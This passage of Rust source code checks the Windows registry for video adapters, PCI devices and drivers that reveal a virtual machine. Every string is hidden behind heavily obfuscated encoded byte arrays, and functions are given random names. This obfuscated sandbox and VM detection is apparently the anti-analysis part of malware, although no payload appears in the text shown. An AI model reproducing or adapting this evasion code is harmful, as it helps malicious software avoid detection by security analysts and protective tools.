, 235 , 162 , 64 , 137 , 238 , 35 , 6 , 46 , 121 , 58 , 250 , 127 , 110 , 168 , 164 , 110 , 205 , 72 , 130 , 16 , 156 , 69 , 207 , 160 , 194 , 28 , 66 , 234 , 91 , 220 , 84 , 21 , 83 , 221 , 232 , 184 , 22 , 157 , 56 , 156 , 14 , 226 , 234 , 24 , 70 , 115 , 144 , 16 , 118 , 64 , 234 , 205 , 23 , 176 , 177 , 249] , & [4 , 70 , 15 , 253 , 152 , 26 , 223 , 228 , 80 , 229 , 178 , 95 , 199 , 115 , 204 , 212 , 226 , 185 , 126 , 253 , 137 , 3 , 121 , 229 , 100 , 95 , 99 , 157 , 203 , 102 , 159 , 117 , 239 , 184 , 178 , 187 , 165 , 170 , 71 , 119 , 75 , 22 , 72 , 64 , 238 , 33 , 5 , 234 , 153 , 62 , 221 , 68 , 88 , 42 , 49 , 199 , 8 , 113 , 35 , 40 , 11 , 158 , 35 , 237 , 199 , 104 , 29 , 130 , 146 , 174 , 157 , 47 , 116 , 79 , 167 , 222 , 183 , 222 , 65 , 164 , 219 , 191 , 41 , 104 , 17 , 235 , 71 , 11] , 23459111371756u64)) ; let mut buffer : [u16 ; (30 + 226)] = [0 ; (113 + 143)] ; let mut buffer_size = (buffer . len () * std :: mem :: size_of :: < u16 > ()) as u32 ; if unsafe { RegQueryValueExW (adapter_key_handle , PCWSTR (value_name . as_ptr ()) , None , None , Some (buffer . as_mut_ptr () as * mut u8) , Some (& mut buffer_size) ,) } . is_ok () { let value = String :: from_utf16_lossy (& buffer [.. buffer_size as usize / 2]) ; for vm_adapter in & vm_adapters { if value . contains (& * * vm_adapter) { unsafe { let _ = RegCloseKey (adapter_key_handle) ; let _ = RegCloseKey (video_key_handle) ; } ; return true ; } } } unsafe { let _ = RegCloseKey (adapter_key_handle) ; } ; } } unsafe { let _ = RegCloseKey (video_key_handle) ; } ; false } pub fn check_pci_devices () -> bool { let mut pci_key_handle : HKEY = HKEY (0) ; let pci_key_path = b_acilzxq (& decode_tk_smkebhmyyv (& [90 , 86 , 51 , 68 , 185 , 133 , 192 , 66 , 125 , 68 , 53 , 68 , 109 , 135 , 233 , 62 , 106 , 210 , 28 , 132 , 10 , 108 , 15 , 119 , 57 , 229 , 172 , 127 , 212 , 162 , 136 , 36 , 80 , 176 , 86 , 211 , 162 , 35 , 92 , 149 , 123 , 42 , 211 , 85 , 164 , 99 , 133 , 64 , 84 , 48 , 187 , 211 , 36 , 81 , 203 , 112 , 7 , 122 , 132 , 138 , 51 , 81 , 73 , 81 , 75 , 176 , 66 , 87 , 106 , 77 , 212 , 139 , 51 , 188 , 16 , 207 , 105 , 180 , 242 , 41 , 30 , 208 , 158 , 36 , 84 , 14 , 63 , 145 , 127 , 69 , 252 , 84 , 58 , 59 , 220 , 52 , 185 , 156 , 180 , 244 , 96 , 218 , 77 , 27 , 20 , 203 , 55 , 167 , 153 , 244 , 118 , 42 , 56 , 138 , 241 , 210 , 96 , 66 , 178 , 63 , 251 , 45 , 223 , 135 , 249 , 130 , 83 , 72 , 205 , 81 , 54 , 91 , 180 , 166 , 51 , 69 , 98 , 163 , 248 , 238 , 71 , 161 , 145 , 116 , 149 , 150 , 172 , 218 , 68 , 225 , 48 , 209 , 166 , 18 , 255 , 45 , 56 , 29 , 239 , 17 , 122 , 51 , 9 , 123 , 70 , 77 , 216 , 228 , 48 , 250 , 46 , 37 , 187 , 204 , 155 , 136 , 46 , 189 , 19 , 144 , 186 , 129 , 245 , 30 , 55 , 186 , 216 , 35 , 45 , 88 , 109 , 59 , 207 , 192 , 47 , 55 , 147 , 127 , 225 , 168 , 12 , 110 , 74 , 193 , 50 , 163 , 116 , 137 , 12 , 178 , 32 , 155 , 128 , 215 , 87 , 191 , 8 , 234 , 186 , 163 , 11 , 119 , 59 , 255 , 101 , 63 , 224 , 121 , 206 , 193 , 74 , 130 , 172 , 248 , 250 , 250 , 75 , 233 , 130 , 252 , 239 , 139 , 121 , 201 , 179 , 51 , 61 , 241 , 66 , 58 , 176 , 59 , 159 , 130 , 201 , 104 , 210 , 50 , 239 , 149 , 76 , 36 , 153 , 79 , 22 , 209 , 206 , 27 , 217 , 77 , 180 , 255 , 122 , 138 , 132 , 233 , 149 , 156 , 58 , 200 , 166 , 72 , 134 , 6 , 181 , 128 , 97 , 30 , 203 , 196 , 83 , 225 , 238 , 222 , 191 , 222 , 125 , 186 , 29 , 7 , 196 , 51 , 102 , 183 , 46 , 229 , 53 , 116 , 134 , 168 , 75 , 56 , 135 , 19 , 227 , 243 , 90 , 50 , 219 , 139 , 56 , 171 , 176 , 68 , 75 , 122 , 188 , 75 , 212 , 71 , 191 , 222 , 226 , 167 , 171 , 8 , 157 , 68 , 227 , 49 , 70 , 235 , 185 , 14 , 143 , 181 , 23 , 111 , 68 , 188 , 118 , 39 , 245 , 48 , 31 , 77 , 136 , 247 , 242 , 229 , 53 , 246 , 133 , 18 , 32 , 96 , 171 , 197 , 157 , 76 , 192 , 175 , 162 , 23 , 176 , 253 , 145 , 14 , 229 , 31 , 224 , 251 , 4 , 30 , 199 , 193 , 7 , 133 , 41 , 200 , 130 , 157 , 124 , 182 , 43 , 189 , 83 , 114 , 18 , 94] , & [104 , 63 , 206 , 249 , 252 , 172 , 252 , 107 , 89 , 210 , 112 , 249 , 232 , 8 , 0 , 251 , 120 , 216 , 239 , 167 , 231 , 23 , 134 , 144 , 124 , 210 , 59 , 26 , 189 , 62 , 0 , 96 , 126 , 28 , 213 , 187 , 136 , 83 , 146 , 37 , 70 , 25 , 156 , 210 , 37 , 210 , 191 , 127 , 106 , 250 , 11 , 203 , 244 , 2 , 125 , 113 , 167 , 244 , 135 , 227 , 206 , 183 , 229 , 184 , 227 , 126 , 20 , 51 , 159 , 64 , 255 , 46 , 56 , 232 , 157 , 161 , 133 , 117 , 91 , 124 , 175 , 92 , 115 , 112 , 43 , 205 , 7 , 39] , 229243879427163u64)) ; if unsafe { RegOpenKeyExW (HKEY_LOCAL_MACHINE , PCWSTR (pci_key_path . as_ptr ()) , 0 , KEY_READ , & mut pci_key_handle ,) } . is_err () { return false ; } let vm_pci_devices = [decode_tk_smkebhmyyv (& [228 , 70 , 227 , 251 , 237 , 140 , 183 , 184 , 151 , 249 , 10 , 238 , 181 , 20 , 31 , 222 , 204 , 241 , 110 , 119 , 25 , 73 , 235 , 201 , 80 , 34 , 65 , 128 , 193 , 210 , 205 , 195 , 94 , 191 , 177 , 254 , 45 , 222 , 245 , 65 , 191 , 185 , 140 , 144 , 115 , 41 , 8 , 121 , 173 , 88 , 251 , 211 , 197 , 220 , 172 , 31 , 19 , 119 , 21 , 238 , 136 , 205 , 159 , 235 , 42 , 62 , 191 , 124 , 28 , 148 , 182 , 70 , 115 , 101 , 138 , 49 , 5 , 171 , 214 , 71 , 188 , 187 , 136 , 222 , 212 , 73 , 241 , 128 , 18 , 113 , 65 , 254 , 208 , 157 , 202 , 85 , 154 , 69 , 155 , 169 , 178 , 192 , 185 , 228 , 205 , 157 , 224 , 91 , 121 , 102 , 41 , 168 , 231 , 109 , 244 , 43 , 239 , 249 , 71 , 159 , 109 , 58 , 90 , 141 , 103 , 145 , 180 , 143 , 207 , 72 , 139 , 13 , 29 , 234 , 226 , 187 , 4 , 93 , 91 , 149 , 146 , 161 , 34 , 245] , & [63 , 1 , 112 , 171 , 135 , 230 , 11 , 32 , 91 , 194 , 28 , 174 , 85 , 34 , 22 , 71 , 154 , 94 , 200 , 192 , 227 , 211 , 229 , 193 , 224 , 163 , 54 , 117 , 120 , 214 , 15 , 24 , 95 , 208 , 178 , 40 , 33 , 169 , 60 , 88 , 77 , 115 , 38 , 132 , 199 , 229 , 44 , 241 , 143 , 142 , 84 , 4 , 187 , 99 , 25 , 157 , 101 , 245 , 201 , 175 , 40 , 36 , 251 , 219 , 77 , 45 , 193 , 156 , 201 , 129 , 102 , 147 , 138 , 122 , 145 , 53 , 245 , 16 , 143 , 225 , 187 , 32 , 31 , 191 , 156 , 2 , 97 , 198] , 25426206393250u64) , decode_tk_smkebhmyyv (& [235 , 184 , 239 , 208 , 183 , 41 , 55 , 123 , 120 , 53 , 123 , 50 , 86 , 130 , 145 , 58 , 224 , 236 , 10 , 174 , 42 , 82 , 117 , 29 , 103 , 10 , 117 , 124 , 188 , 19 , 1 , 125 , 251 , 39 , 112 , 196 , 34 , 45 , 228 , 240 , 16 , 238 , 185 , 78 , 127 , 2 , 107 , 221 , 213 , 40 , 234 , 137 , 230 , 49 , 164 , 156 , 116 , 214 , 66 , 5 , 15 , 123 , 219 , 52 , 144 , 225 , 198 , 201 , 61 , 1 , 112 , 133 , 140 , 45 , 150 , 131 , 95 , 24 , 9 , 216 , 123 , 17 , 74 , 127 , 65 , 132 , 40 , 59 , 249 , 55 , 127 , 227 , 127 , 149 , 99 , 219 , 217 , 168 , 240 , 107 , 21 , 30 , 188 , 176 , 50 , 78 , 2 , 64 , 81 , 157 , 190 , 16 , 236 , 72 , 114 , 186 , 90 , 163 , 99 , 227 , 242 , 121 , 128 , 56 , 191 , 248 , 48 , 200 , 213 , 80 , 42 , 23 , 146 , 67 , 179 , 182 , 154 , 115 , 168 , 241 , 151 , 153 , 142 , 156 , 252 , 158 , 226 , 49 , 141 , 72 , 57 , 151 , 11 , 177 , 117 , 196 , 215 , 80 , 225 , 170 , 95 , 128 , 235 , 114 , 163 , 177 , 194 , 112 , 57 , 31 , 219 , 133 , 27 , 16 , 180 , 242 , 40 , 255 , 38 , 57 , 128 , 97 , 40 , 232 , 111 , 140 , 211 , 245 , 55 , 120 , 220 , 81 , 64 , 47 , 94 , 217 , 6 , 72 , 39 , 76 , 254 , 54 , 169 , 167 , 100 , 65 , 29 , 46 , 14 , 253 , 14 , 3 , 69 , 163 , 199 , 60 , 162 , 79 , 108 , 17 , 173 , 136 , 121 , 202 , 124 , 237 , 179 , 242 , 132 , 183 , 201 , 173 , 182 , 128 , 55 , 211 , 111 , 138 , 7 , 45 , 81 , 223 , 133 , 76 , 48 , 14 , 118 , 153 , 194 , 29 , 200 , 106 , 163 , 2 , 46 , 39 , 65 , 81 , 244 , 91 , 58 , 232 , 1 , 86 , 111 , 92 , 192 , 182 , 153 , 112 , 14 , 188 , 170 , 180 , 249 , 99 , 39 , 77 , 114 , 241 , 59 , 240 , 113 , 16 , 176 , 113 , 156 , 54] , & [56 , 76 , 172 , 88 , 65 , 227 , 232 , 107 , 223 , 208 , 97 , 146 , 9 , 200 , 148 , 31 , 25 , 38 , 162 , 201 , 60 , 103 , 108 , 249 , 102 , 93 , 36 , 173 , 217 , 168 , 46 , 128 , 24 , 9 , 17 , 49 , 218 , 150 , 115 , 124 , 4 , 104 , 77 , 118 , 180 , 143 , 106 , 104 , 123 , 220 , 66 , 169 , 218 , 32 , 15 , 244 , 52 , 88 , 148 , 178 , 68 , 31 , 110 , 140 , 117 , 108 , 109 , 46 , 19 , 198 , 224 , 145 , 50 , 71 , 186 , 43 , 52 , 51 , 135 , 194 , 211 , 236 , 108 , 86 , 21 , 68 , 18 , 15] , 126491081836842u64) , decode_tk_smkebhmyyv (& [149 , 0 , 172 , 249 , 29 , 199 , 199 , 119 , 217 , 228 , 25 , 188 , 106 , 123 , 112 , 115 , 52 , 207 , 192 , 218 , 162 , 135 , 118 , 171 , 134 , 44 , 59 , 67 , 138 , 242 , 101 , 188 , 247 , 161 , 180 , 141 , 83 , 6 , 124 , 87 , 105 , 192 , 130 , 233 , 165 , 31 , 100 , 84 , 223 , 212 , 69 , 16 , 86 , 88 , 174 , 32 , 250 , 52 , 104 , 114 , 161 , 235 , 55 , 196 , 204 , 35 , 200 , 90 , 6 , 98 , 161 , 200 , 57 , 8 , 73 , 89 , 64 , 227 , 36 , 125 , 168 , 167 , 17 , 217 , 243 , 4 , 52 , 6 , 175 , 43 , 184 , 29 , 58 , 140 , 106 , 53 , 68 , 100 , 203 , 81 , 239 , 186 , 85 , 145 , 210 , 7 , 91 , 202 , 50 , 56 , 144 , 27 , 83 , 74 , 90 , 238 , 106 , 78 , 123 , 110 , 74 , 245 , 15 , 162 , 138 , 234 , 56 , 99 , 71 , 123 , 66 , 215 , 252 , 120 , 71 , 192 , 224 , 170 , 103 , 94 , 167 , 48 , 184 , 31 , 140 , 124 , 185 , 21 , 17 , 164 , 52 , 190 , 52 , 203 , 193 , 120 , 202 , 96 , 242 , 123 , 67 , 188 , 145 , 174 , 183 , 0 , 215 , 217 , 47 , 86 , 33 , 190 , 154 , 157 , 64 , 243 , 98 , 232 , 255 , 201 , 227 , 118 , 149 , 19 , 140 , 244 , 34 , 176 , 5 , 188 , 246 , 83] , & [155 , 252 , 180 , 252 , 232 , 4 , 25 , 245 , 192 , 114 , 208 , 46 , 234 , 233 , 166 , 121 , 122 , 198 , 74 , 180 , 153 , 56 , 145 , 92 , 34 , 43 , 113 , 213 , 253 , 184 , 108 , 0 , 19 , 254 , 50 , 194 , 139 , 62 , 233 , 177 , 215 , 94 , 233 , 150 , 247 , 146 , 11 , 133 , 150 , 75 , 88 , 5 , 43 , 202 , 219 , 124 , 45 , 39 , 241 , 21 , 12 , 20 , 14 , 123 , 90 , 148 , 253 , 95 , 36 , 64 , 176 , 182 , 120 , 203 , 1 , 42 , 73 , 211 , 36 , 235 , 218 , 158 , 129 , 72 , 177 , 112 , 173 , 109] , 37976100832438u64) ,] ; let mut i = 0 ; loop { let mut subkey_name_buffer : [u16 ; (51 + 205)] = [0 ; (16 + 240)] ; let mut subkey_name_len = subkey_name_buffer . len () as u32 ; if unsafe { RegEnumKeyExW (pci_key_handle , i , PWSTR (subkey_name_buffer . as_mut_ptr ()) , & mut subkey_name_len , None , PWSTR (std :: ptr :: null_mut ()) , None , None ,) } . is_err () { break ; } i += 1 ; let subkey_name = String :: from_utf16_lossy (& subkey_name_buffer [.. subkey_name_len as usize]) ; let device_key_path = format ! ("SYSTEM\\CurrentControlSet\\Enum\\PCI\\{}" , subkey_name) ; let mut device_key_handle : HKEY = HKEY (0) ; let device_key_pcwstr = b_acilzxq (& device_key_path) ; if unsafe { RegOpenKeyExW (HKEY_LOCAL_MACHINE , PCWSTR (device_key_pcwstr . as_ptr ()) , 0 , KEY_READ , & mut device_key_handle ,) } . is_ok () { let value_name = b_acilzxq (& decode_tk_smkebhmyyv (& [71 , 199 , 215 , 235 , 208 , 75 , 50 , 192 , 50 , 72 , 62 , 129 , 229 , 80 , 138 , 85 , 47 , 235 , 70 , 143 , 60 , 222 , 155 , 47 , 251 , 127 , 244 , 181 , 145 , 196 , 6 , 142 , 60 , 203 , 205 , 78 , 174 , 108 , 195 , 89 , 145 , 233 , 40 , 253 , 124 , 8 , 8 , 49 , 179 , 102 , 41 , 144 , 219 , 229 , 170 , 162 , 155 , 39 , 65 , 15 , 58 , 231 , 64 , 158 , 20 , 216 , 10 , 186 , 56 , 31 , 83 , 230 , 254 , 89 , 185 , 237 , 82 , 241 , 172 , 4 , 174 , 124 , 147 , 60 , 76 , 27 , 170 , 124 , 8 , 55 , 143 , 12 , 14 , 112 , 93 , 69 , 243 , 167 , 205 , 154 , 103 , 43 , 133 , 89 , 209 , 152 , 132 , 218 , 161 , 16 , 198 , 166 , 83 , 17 , 6 , 74 , 191 , 250 , 4 , 200 , 242 , 168 , 204 , 30 , 61 , 201 , 36 , 187 , 204 , 41 , 246 , 236 , 44 , 177 , 98 , 130 , 158 , 24 , 134 , 199 , 114 , 16 , 125 , 39] , & [137 , 245 , 5 , 37 , 202 , 61 , 122 , 180 , 6 , 255 , 182 , 114 , 255 , 230 , 84 , 152 , 117 , 186 , 149 , 93 , 242 , 203 , 98 , 49 , 2 , 59 , 7 , 217 , 187 , 19 , 119 , 173 , 127 , 143 , 72 , 192 , 116 , 234 , 38 , 240 , 200 , 182 , 243 , 179 , 197 , 26 , 39 , 127 , 95 , 19 , 196 , 240 , 232 , 230 , 72 , 83 , 238 , 26 , 162 , 145 , 31 , 222 , 29 , 154 , 195 , 229 , 167 , 74 , 5 , 105 , 138 , 1 , 221 , 188 , 125 , 134 , 243 , 39 , 38 , 161 , 182 , 48 , 31 , 206 , 166 , 99 , 136 , 36] , 22681722291152u64)) ; let mut buffer : [u16 ; (47 + 209)] = [0 ; (67 + 189)] ; let mut buffer_size = (buffer . len () * std :: mem :: size_of :: < u16 > ()) as u32 ; if unsafe { RegQueryValueExW (device_key_handle , PCWSTR (value_name . as_ptr ()) , None , None , Some (buffer . as_mut_ptr () as * mut u8) , Some (& mut buffer_size) ,) } . is_ok () { let value = String :: from_utf16_lossy (& buffer [.. buffer_size as usize / 2]) ; for vm_device in & vm_pci_devices { if value . contains (& * * vm_device) { unsafe { let _ = RegCloseKey (device_key_handle) ; let _ = RegCloseKey (pci_key_handle) ; } ; return true ; } } } unsafe { let _ = RegCloseKey (device_key_handle) ; } ; } } unsafe { let _ = RegCloseKey (pci_key_handle) ; } ; false } pub fn check_drivers () -> bool { let mut services_key_handle : HKEY = HKEY (0) ; let services_key_path = b_acilzxq (& decode_tk_smkebhmyyv (& [178 , 192 , 128 , 155 , 208 , 122 , 70 , 251 , 46 , 205 , 167 , 218 , 126 , 107 , 53 , 54 , 23 , 138 , 199 , 46 , 99 , 13 , 168 , 52 , 115 , 164 , 90 , 74 , 47 , 62 , 174 , 234 , 152 , 105 , 157 , 36 , 153 , 218 , 190 , 94 , 197 , 252 , 107 , 172 , 131 , 41 , 8 , 152 , 177 , 239 , 14 , 117 , 100 , 127 , 125 , 207 , 173 , 243 , 58 , 153 , 233 , 162 , 44 , 172 , 10 , 14 , 238 , 210 , 38 , 46 , 14 , 135 , 11 , 15 , 228 , 99 , 112 , 63 , 121 , 253 , 61 , 245 , 193 , 142 , 106 , 232 , 14 , 35 , 116 , 169 , 236 , 33 , 61 , 230 , 114 , 48 , 254 , 82 , 16 , 5 , 54 , 136 , 56 , 120 , 13 , 236 , 111 , 245 , 195 , 251 , 41 , 223 , 135 , 206 , 53 , 233 , 110 , 108 , 251 , 13 , 57 , 171 , 25 , 52 , 51 , 64 , 63 , 194 , 26 , 192 , 89 , 9 , 122 , 71 , 140 , 63 , 76 , 180 , 114 , 250 , 251 , 5 , 198 , 94 , 103 , 182 , 152 , 167 , 26 , 164 , 61 , 161 , 79 , 221 , 134 , 105 , 105 , 173 , 156 , 155 , 121 , 196 , 9 , 218 , 200 , 114 , 11 , 24 , 118 , 206 , 29 , 24 , 79 , 233 , 170 , 72 , 8 , 178 , 26 , 220 , 185 , 239 , 255 , 153 , 164 , 122 , 21 , 107 , 49 , 7 , 181 , 125 , 33 , 40 , 175 , 164 , 91 , 177 , 208 , 50 , 171 , 131 , 145 , 246 , 129 , 121 , 69 , 130 , 3 , 211 , 105 , 68 , 25 , 94 , 1 , 241 , 104 , 51 , 35 , 82 , 201 , 124 , 68 , 183 , 218 , 168 , 223 , 96 , 102 , 68 , 10 , 91 , 191 , 98 , 98 , 32 , 156 , 160 , 116 , 74 , 20 , 228 , 159 , 42 , 134 , 23 , 14 , 150 , 254 , 151 , 57 , 195 , 73 , 37 , 173 , 160 , 249 , 179 , 23 , 224 , 152 , 105 , 68 , 22 , 56 , 44 , 20 , 37 , 67 , 60 , 172 , 21 , 126 , 182 , 121 , 193 , 130 , 137 , 63 , 5 , 88 , 133 , 111 , 49 , 94 , 18 , 15 , 91 , 62 , 71 , 24 , 253 , 53 , 18 , 0 , 162 , 82 , 220 , 20 , 173 , 95 , 47 , 110 , 106 , 184 , 121 , 34 , 57 , 8 , 146 , 168 , 194 , 8 , 34 , 144 , 160 , 159 , 36 , 95 , 243 , 223 , 61 , 226 , 69 , 205 , 205 , 118 , 159 , 31 , 2 , 73 , 104 , 38 , 35 , 137 , 225 , 68 , 147 , 148 , 27 , 169 , 149 , 210 , 182 , 92 , 129 , 189 , 106 , 205 , 206 , 197 , 222 , 88 , 222 , 34 , 46 , 190 , 241 , 97 , 95 , 109 , 71 , 237 , 245 , 254 , 5 , 106 , 31 , 53 , 23 , 244 , 176 , 138 , 171 , 146 , 190 , 39 , 114 , 34 , 187 , 203 , 66 , 179 , 115 , 84 , 251 , 209 , 202 , 153 , 254 , 142 , 118 , 168 , 124 , 155 , 209 , 232 , 143 , 151 , 73] , & [110 , 57 , 151 , 129 , 6 , 246 , 96 , 131 , 118 , 161 , 203 , 115 , 192 , 108 , 59 , 231 , 254 , 46 , 137 , 28 , 37 , 145 , 21 , 75 , 107 , 245 , 60 , 142 , 18 , 36 , 178 , 83 , 210 , 96 , 168 , 82 , 168 , 239 , 101 , 226 , 142 , 5 , 234 , 214 , 45 , 57 , 35 , 216 , 81 , 108 , 126 , 219 , 187 , 15 , 211 , 54 , 163 , 159 , 23 , 77 , 99 , 131 , 195 , 205 , 230 , 199 , 12 , 66 , 150 , 127 , 172 , 250 , 103 , 139 , 38 , 202 , 182 , 242 , 135 , 115 , 192 , 16 , 63 , 4 , 254 , 85 , 87 , 222] , 230510894779602u64)) ; if unsafe { RegOpenKeyExW (HKEY_LOCAL_MACHINE , PCWSTR (services_key_path . as_ptr ()) , 0 , KEY_READ , & mut services_key_handle ,) } . is_err () { return false ; } let vm_drivers = [decode_tk_smkebhmyyv (& [149 , 219 , 195 , 86 , 238 , 140 , 209 , 203 , 174 , 98 , 137 , 117 , 88 , 229 , 25 , 245 , 24 , 133 , 128 , 13 , 225 , 113 , 1 , 242 , 61 , 200 , 133 , 161 , 176 , 64 , 141 , 154 , 52 , 101 , 97 , 58 , 10 , 91 , 53 , 18 , 161 , 225 , 57 , 43 , 170 , 241 , 70 , 45 , 92 , 176 , 48 , 211 , 246 , 53 , 117 , 150 , 93 , 199 , 234 , 89 , 100 , 70 , 27 , 197 , 165 , 24 , 253 , 71 , 246 , 65 , 54 , 222 , 211 , 196 , 86 , 204 , 82 , 35 , 127 , 225 , 235 , 82 , 217 , 166 , 150 , 140 , 12 , 207 , 238 , 216 , 132 , 78 , 54 , 218 , 82 , 19] , & [126 , 121 , 17 , 185 , 40 , 94 , 169 , 180 , 28 , 59 , 211 , 174 , 131 , 48 , 232 , 208 , 169 , 41 , 64 , 35 , 132 , 205 , 179 , 147 , 213 , 149 , 40 , 103 , 19 , 235 , 92 , 120 , 112 , 255 , 205 , 167 , 181 , 99 , 1 , 161 , 59 , 225 , 118 , 12 , 39 , 68 , 88 , 169 , 74 , 180 , 126 , 94 , 225 , 5 , 226 , 151 , 193 , 25 , 40 , 220 , 206 , 79 , 176 , 145 , 159 , 159 , 107 , 71 , 225 , 155 , 57 , 138 , 18 , 224 , 206 , 213 , 64 , 164 , 65 , 81 , 21 , 199 , 23 , 42 , 255 , 125 , 187 , 131] , 10153302688414u64) , decode_tk_smkebhmyyv (& [170 , 14 , 165 , 47 , 190 , 20 , 69 , 90 , 21 , 253 , 114 , 254 , 161 , 124 , 133 , 158 , 142 , 60 , 64 , 96 , 202 , 97 , 8 , 19 , 226 , 190 , 163 , 76 , 203 , 250 , 199 , 223 , 69 , 136 , 24 , 153 , 187 , 226 , 123 , 53 , 27 , 142 , 5 , 96 , 30 , 117 , 16 , 203 , 97 , 215 , 151 , 149 , 8 , 103 , 47 , 134 , 95 , 205 , 116 , 38 , 104 , 124 , 227 , 114 , 147 , 153 , 94 , 11 , 129 , 22 , 233 , 82 , 132 , 97 , 116 , 251 , 60 , 185 , 148 , 126 , 156 , 207 , 53 , 100 , 162 , 56 , 49 , 224 , 13 , 98 , 41 , 158 , 232 , 80 , 201 , 215] , & [231 , 13 , 144 , 105 , 46 , 120 , 209 , 51 , 102 , 48 , 101 , 71 , 86 , 220 , 216 , 89 , 23 , 72 , 93 , 192 , 31 , 79 , 25 , 251 , 106 , 103 , 66 , 135 , 84 , 243 , 229 , 81 , 220 , 38 , 63 , 202 , 10 , 91 , 108 , 140 , 66 , 26 , 158 , 10 , 38 , 221 , 14 , 89 , 164 , 26 , 66 , 17 , 37 , 12 , 170 , 189 , 138 , 241 , 89 , 211 , 248 , 44 , 141 , 205 , 107 , 53 , 187 , 157 , 116 , 185 , 51 , 82 , 1 , 94 , 28 , 162 , 189 , 66 , 72 , 24 , 173 , 8 , 229 , 113 , 157 , 125 , 79 , 139] , 10252086936227u64) , decode_tk_smkebhmyyv (& [45 , 222 , 192 , 236 , 151 , 138 , 69 , 25 , 146 , 193 , 2 , 227 , 82 , 184 , 217 , 57 , 119 , 10 , 21 , 203 , 116 , 117 , 204 , 73 , 160 , 85 , 58 , 45 , 138 , 101 , 187 , 230 , 161 , 169 , 247 , 111 , 153 , 227 , 37 , 241 , 139 , 56 , 175 , 106 , 255 , 91 , 159 , 133 , 225 , 147 , 140 , 57 , 141 , 72 , 34 , 20 , 10 , 155 , 28 , 75 , 242 , 83 , 171 , 146 , 199 , 103 , 49 , 102 , 11 , 4 , 61 , 81 , 160 , 15 , 117 , 141 , 245 , 77 , 238 , 105 , 134 , 102 , 143 , 251 , 243 , 51 , 15 , 32 , 118 , 17 , 65 , 97 , 254 , 133 , 41 , 228] , & [10 , 141 , 103 , 252 , 160 , 204 , 47 , 236 , 165 , 124 , 42 , 150 , 160 , 170 , 79 , 119 , 161 , 109 , 246 , 16 , 140 , 30 , 242 , 175 , 50 , 56 , 163 , 105 , 234 , 108 , 216 , 139 , 166 , 54 , 62 , 102 , 15 , 134 , 117 , 105 , 71 , 18 , 168 , 217 , 33 , 119 , 186 , 97 , 172 , 240 , 232 , 172 , 141 , 14 , 89 , 135 , 29 , 130 , 113 , 111 , 39 , 210 , 104 , 93 , 42 , 48 , 65 , 167 , 73 , 168 , 41 , 119 , 246 , 117 , 243 , 220 , 45 , 59 , 171 , 221 , 10 , 142 , 189 , 120 , 171 , 137 , 95 , 7] , 10136122819225u64) , decode_tk_smkebhmyyv (& [244 , 220 , 17 , 209 , 172 , 166 , 236 , 4 , 16 , 64 , 214 , 232 , 26 , 161 , 161 , 196 , 168 , 237 , 172 , 183 , 24 , 145 , 198 , 64 , 164 , 71 , 173 , 250 , 128 , 253 , 53 , 104 , 35 , 109 , 242 , 32 , 20 , 163 , 154 , 96 , 74 , 6 , 131 , 94 , 168 , 74 , 248 , 100 , 97 , 67 , 230 , 245 , 228 , 55 , 68 , 75 , 31 , 98 , 88 , 97 , 35 , 62 , 111 , 250 , 6 , 105 , 0 , 26 , 2 , 62 , 182 , 248 , 156 , 215 , 219 , 115 , 22 , 88 , 2 , 210 , 57 , 179 , 101 , 31 , 232 , 3 , 202 , 171 , 183 , 74 , 143 , 17 , 78 , 14 , 116 , 228 , 221 , 95 , 68 , 167 , 118 , 167 , 3 , 24 , 202 , 90 , 231 , 176 , 137 , 216 , 54 , 96 , 54 , 113 , 1 , 219 , 160 , 131 , 129 , 38 , 202 , 158 , 187 , 190 , 220 , 205 , 154 , 159] , & [139 , 183 , 88 , 162 , 36 , 27 , 117 , 174 , 89 , 185 , 67 , 63 , 218 , 173 , 146 , 30 , 153 , 58 , 209 , 218 , 22 , 36 , 28 , 191 , 244 , 253 , 158 , 243 , 3 , 206 , 218 , 87 , 38 , 74 , 84 , 183 , 149 , 253 , 122 , 98 , 118 , 254 , 230 , 130 , 100 , 71 , 44 , 79 , 114 , 118 , 164 , 22 , 1 , 12 , 92 , 188 , 155 , 39 , 215 , 156 , 97 , 91 , 230 , 13 , 207 , 25 , 186 , 97 , 7 , 114 , 78 , 179 , 44 , 38 , 228 , 194 , 39 , 239 , 172 , 138 , 217 , 85 , 125 , 4 , 222 , 142 , 189 , 7] , 21406117004264u64) , decode_tk_smkebhmyyv (& [56 , 214 , 29 , 237 , 237 , 102 , 146 , 142 , 144 , 22 , 62 , 67 , 152 , 181 , 187 , 7 , 36 , 2 , 177 , 192 , 139 , 247 , 139 , 149 , 110 , 168 , 185 , 22 , 62 , 200 , 78 , 167 , 209 , 140 , 7 , 243 , 184 , 80 , 251 , 213 , 190 , 112 , 137 , 204 , 171 , 125 , 54 , 30 , 29 , 67 , 109 , 52 , 229 , 88 , 133 , 225 , 243 , 133 , 242 , 27 , 88 , 46 , 95 , 138 , 39 , 42 , 208 , 223 , 2 , 127 , 39 , 246 , 69 , 93 , 148 , 217 , 219 , 3 , 38 , 1 , 172 , 253 , 135 , 138 , 132 , 209 , 133 , 217 , 160 , 26 , 81 , 27 , 242 , 90 , 233 , 25] , & [251 , 35 , 157 , 45 , 221 , 137 , 93 , 102 , 13 , 12 , 158 , 255 , 60 , 137 , 233 , 19 , 179 , 179 , 224 , 90 , 233 , 156 , 41 , 214 , 38 , 134 , 116 , 117 , 168 , 16 , 42 , 113 , 73 , 159 , 241 , 216 , 20 , 161 , 112 , 137 , 158 , 81 , 131 , 3 , 44 , 163 , 188 , 141 , 213 , 117 , 248 , 252 , 220 , 81 , 70 , 158 , 192 , 138 , 169 , 204 , 122 , 149 , 223 , 114 , 217 , 195 , 82 , 119 , 179 , 115 , 46 , 72 , 148 , 82 , 146 , 4 , 0 , 243 , 199 , 111 , 99 , 161 , 3 , 49 , 54 , 199 , 155 , 82] , 10114647982739u64) , decode_tk_smkebhmyyv (& [175 , 125 , 71 , 131 , 5 , 27 , 98 , 14 , 239 , 151 , 138 , 161 , 181 , 231 , 35 , 46 , 65 , 58 , 87 , 169 , 163 , 217 , 123 , 187 , 194 , 181 , 41 , 154 , 55 , 206 , 170 , 40 , 198 , 131 , 181 , 159 , 200 , 119 , 35 , 239 , 23 , 254 , 226 , 6 , 2 , 37 , 107 , 11 , 54 , 79 , 138 , 142 , 114 , 206 , 131 , 22 , 158 , 90 , 199 , 169 , 248 , 27 , 63 , 113 , 89 , 123 , 35 , 32 , 115 , 218 , 168 , 163 , 180 , 205 , 84 , 46 , 13 , 0 , 95 , 240] , & [237 , 64 , 244 , 227 , 156 , 96 , 115 , 194 , 111 , 138 , 166 , 194 , 189 , 217 , 174 , 161 , 8 